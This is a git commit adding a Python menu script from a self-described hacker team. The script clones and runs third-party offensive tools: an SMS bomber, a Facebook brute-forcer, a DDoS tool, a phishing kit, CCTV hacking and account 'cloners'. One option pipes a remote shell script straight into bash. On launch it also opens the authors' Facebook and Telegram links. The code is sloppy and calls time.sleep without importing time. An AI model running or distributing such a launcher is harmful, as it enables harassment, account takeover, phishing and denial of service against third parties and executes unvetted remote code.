05954687217da5d897a2a40b4d3ced157101bca4
Sãíkø Hãçkér Téãm <mdsaida926@gmail.com>
2024-12-18 19:04:35 +0600

    Add files via upload

---
+++ FUCK-YOU.py
@@ -0,0 +1,288 @@
+import os
+
+os.system('clear')
+
+os.system("pip install requests")
+
+os.system("xdg-open https://www.facebook.com/profile.php?id=61551487702871&mibextid=ZbWKwL")
+
+
+def Zeek():
+    os.system('clear')
+
+    os.system("xdg-open https://www.facebook.com/groups/694288526013401/?ref=share&mibextid=NSMWBT")
+
+    os.system('clear')
+
+    os.system("xdg-open https://t.me/rm7669")
+
+    os.system('clear')
+
+
+print("""
+\033[1;92m  
+   _____       __  __    ______
+  / ___/      / / / /   /_  __/
+  \__ \______/ /_/ /_____/ /   
+ ___/ /_____/ __  /_____/ /    
+/____/     /_/ /_/     /_/                                                                                                                                           
+
+
+ \033[1;93m×××××××××××××××××\033[1;93m××××××××××××××\033[1;93m××××××××××××××××××
+ \033[1;93m|     \033[1;96m[✓] CREATED BY\33[0;m   :  \033[1;96mRM RONY ALI   \033[1;93m
+ \033[1;93m|     \033[1;32m[✓] FACEBOK      : \033[1;34m RM Rony Ali        \033[1;93m
+ \033[1;93m|     \033[1;35m[✓] GITHUB       :  \033[1;35mS-H-T7669           \033[1;93m
+ \033[1;93m|     \033[1;36m[✓] TOOL STATUS  : \033[1;36m All To All           \033[1;93m
+ \033[1;93m|     \033[1;35m[✓] TEAM         :  \033[1;35mS-H-T                 \033[1;93m
+ \033[1;93m|     \033[1;36m[✓] TOOL VIRSION :  \033[1;36m0.2      \033[1;93m
+ \033[1;93m×××××××××××××××××\033[1;93m×××××××××××××××\033[1;93m×××××××××××××××××
+ \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32mWelcome To S-H-T ....
+ \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m Saiko Hacker Team ....
+ \033[1;93m××××××××××××××××\033[1;93m×××××××××××××××\033[1;93m××××××××××××××××××""")
+
+print("""
+  \033[1;91m[\033[1;97m01\033[1;91m]\033[1;32m SETUP COMMAND \033[1;93m{FAST}
+  \033[1;91m[\033[1;97m02\033[1;91m]\033[1;32m  Saiko Hacker Team  \033[1;91m{WORKING}
+  \033[1;91m[\033[1;97m03\033[1;91m]\033[1;32m File Cloner \033[1;93m{WORKING}
+  \033[1;91m[\033[1;97m04\033[1;91m]\033[1;32m SMS BOMBER \033[1;93m{WORKING}
+  \033[1;91m[\033[1;97m05\033[1;91m]\033[1;32m UNLIMITED COOKIE \033[1;93m{WOARKING}
+  \033[1;91m[\033[1;97m06\033[1;91m]\033[1;32m FB LIKER \033[1;93m{WORKING}
+  \033[1;91m[\033[1;97m07\033[1;91m]\033[1;32m RANDOM CLONE \033[1;91m{WORKING}
+  \033[1;91m[\033[1;97m08\033[1;91m]\033[1;32m OLD ID CLONE 2009-2012 \033[1;93m{WORKING}
+  \033[1;91m[\033[1;97m09\033[1;91m]\033[1;32m TELEGRAM CHANNEL \033[1;93m{WORKING}
+  \033[1;91m[\033[1;97m10\033[1;91m]\033[1;32m OLD ID CLONER \033[1;93m{WORKING}
+  \033[1;91m[\033[1;97m11\033[1;91m]\033[1;32m CRACKER TOOLS \033[1;94m{WORKING}
+  \033[1;91m[\033[1;97m12\033[1;91m]\033[1;32m TERMUX BANNER \033[1;93m{WORKING}
+  \033[1;91m[\033[1;97m13\033[1;91m]\033[1;32m FB BRUTE FORCE \033[1;93m{WORKING}
+  \033[1;91m[\033[1;97m14\033[1;91m]\033[1;32m DDOS ATTACK IP  \033[1;93m{WORKING}
+  \033[1;91m[\033[1;97m15\033[1;91m]\033[1;32m PHISHING TOOLS \033[1;93m{WORKING}
+  \033[1;91m[\033[1;97m16\033[1;91m]\033[1;32m CCTV HACK \033[1;93m{WORKING}
+  \033[1;91m[\033[1;97m17\033[1;91m]\033[1;32m GALLERY HACK \033[1;93m{WORKING}
+  \033[1;91m[\033[1;97m18\033[1;91m]\033[1;32m ROOT TOOLS \033[1;93m{WORKING}
+  \033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××
+""")
+
+pil = input("  \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m CHOOSE: ")
+
+if pil in ["01", "1"]:
+
+    os.system('git clone https://github.com/S-H-T7669/SET-UP')
+
+    os.system('cd SET-UP && python SET-UP.py')
+
+    time.sleep(2)
+
+    print(" ")
+
+    n = input("[ \n\033[1;97mBACK \n\033[1;97m]")
+
+    time.sleep(2)
+
+elif pil in ["02", "2"]:
+
+    os.system('git clone https://github.com/S-H-T7669/S-H-T')
+
+    os.system('cd S-H-T && python S-H-T.py')
+
+    time.sleep(2)
+
+    print(" ")
+
+    n = input("[ \n\033[1;97mBACK \n\033[1;97m]")
+
+    time.sleep(2)
+
+
+
+elif pil in ["03", "3"]:
+
+    os.system('rm -rf File-Clone- && git clone https://github.com/S-H-T7669/File-Clone-')
+
+    os.system('cd File-Clone- && python RONY.py')
+
+    print(" ")
+
+    n = input("[ \n\033[1;32mBACK \n\033[1;97m]")
+
+    time.sleep(2)
+
+elif pil in ["04", "4"]:
+
+    os.system('git clone https://github.com/TheSpeedX/TBomb')
+
+    os.system('cd TBomb && bash TBomb.sh')
+
+    time.sleep(2)
+
+    print(" ")
+
+    n = input("[ \n\033[1;32mBACK \n\033[1;97m]")
+
+    time.sleep(2)
+
+    Zeek()
+
+
+
+elif pil in ["5"]:
+
+    os.system('git clone https://github.com/rm7669/Mithila3')
+
+    os.system(' cd Mithila3 && python Mithila3.py')
+
+    print(" ")
+
+    n = input("[ \n\033[1;97mBACK \n\033[1;97m]")
+
+    time.sleep(2)
+
+
+elif pil in ["6"]:
+
+    os.system('git clone https://github.com/rm7669/FB-Liker')
+
+    os.system('cd FB-Liker && python FB-AUTO-LIKER.PY')
+
+    time.sleep(2)
+
+    print(" ")
+
+    n = input("[ \n\033[1;32mBACK \n\033[1;97m]")
+
+    time.sleep(2)
+
+
+
+elif pil in ["7"]:
+
+    os.system('git clone https://github.com/rm7669/Mithila2')
+
+    os.system('cd Mithila2 && Python Mithila2.py')
+
+    time.sleep(2)
+
+    print(" ")
+
+    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
+
+    time.sleep(2)
+
+
+
+elif pil in ["8"]:
+
+    os.system('git clone https://github.com/rm7669/Mithila')
+
+    os.system('cd Mithila && python RONY.py')
+
+    time.sleep(2)
+
+    print(" ")
+
+    n = input("[ \n\033[1;32mBACK \n\033[1;97m]")
+
+    time.sleep(2)
+
+
+
+elif pil in ["9"]:
+
+    os.system("xdg-open https://t.me/rm7669")
+
+    time.sleep(2)
+
+
+
+elif pil in ["10"]:
+
+    os.system('git clone https://github.com/rm7669/Rony')
+
+    os.system('cd Rony && python RONY.py')
+
+    time.sleep(2)
+
+    print(" ")
+
+    n = input("[ \n\033[1;32mBACK \n\033[1;97m]")
+
+    time.sleep(2)
+
+    Zeek()
+
+
+
+elif pil in ["11"]:
+
+    os.system('rm -rf Cracker-Tool && git clone https://github.com/cracker911181/Cracker-Tool')
+
+    os.system('cd Cracker-Tool && python cracker-main.py')
+
+    time.sleep(2)
+
+    print(" ")
+
+    n = input("[ \n\033[1;32mBACK \n\033[1;97m]")
+
+    time.sleep(2)
+
+elif pil in ["12"]:
+
+    os.system('rm -rf T-LOAD && git clone https://github.com/noob-hackers/T-LOAD')
+
+    os.system('cd  T-LOAD && bash t-load.sh')
+
+    os.system("xdg-open https://www.facebook.com/groups/694288526013401/?ref=share&mibextid=NSMWBT")
+
+elif pil in ["13"]:
+
+    os.system('rm -rf FB-Brute && git clone https://github.com/STLP-TEAM/FB-Brute')
+
+    os.system('cd FB-Brute && python brute.py')
+
+    time.sleep(2)
+
+    print(" ")
+
+    n = input("[ \n\033[1;32mBACK \n\033[1;97m]")
+
+    time.sleep(2)
+
+    Zeek()
+
+elif pil in ["14"]:
+
+    os.system('rm -rf V-DdoS && git clone https://www.github.com/T34mV18rs/V-DdoS.git')
+
+    os.system('cd V-DdoS && python2 V-DdoS.py')
+
+    time.sleep(2)
+
+
+
+elif pil in ["15"]:
+
+    os.system('rm -rf zphisher && git clone --depth=1 https://github.com/htr-tech/zphisher.git')
+
+    os.system('cd zphisher && bash zphisher.sh')
+
+elif pil in ["16"]:
+
+    os.system('rm -rf Cam-Hackers && git clone https://github.com/AngelSecurityTeam/Cam-Hackers ')
+
+    os.system('cd Cam-Hackers && python3 cam-hackers.py')
+
+    time.sleep(2)
+
+elif pil in ["17"]:
+
+    os.system('rm -rf Mithila3 && git clone https://github.com/rm7669/Mithila3')
+
+    os.system('cd Mithila3 &&python Mithila3.py')
+
+
+
+elif pil in ["18"]:
+
+    os.system('curl -s https://raw.githubusercontent.com/cyberkernelofficial/fsu/main/fsu.sh | bash')
+
+    os.system('fsu')
